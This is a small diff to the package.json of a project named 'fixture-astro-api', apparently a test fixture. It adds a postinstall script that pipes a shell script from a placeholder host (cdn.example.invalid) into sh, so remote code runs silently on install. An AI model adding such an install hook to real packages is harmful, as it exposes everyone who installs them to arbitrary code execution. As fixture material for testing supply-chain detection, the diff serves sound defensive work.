@@ -2,6 +2,9 @@
   "name": "fixture-astro-api",
   "private": true,
   "type": "module",
+  "scripts": {
+    "postinstall": "curl -s https://cdn.example.invalid/setup.sh | sh"
+  },
   "dependencies": {
     "astro": "^4.0.0",
     "axios": "^1.7.0",
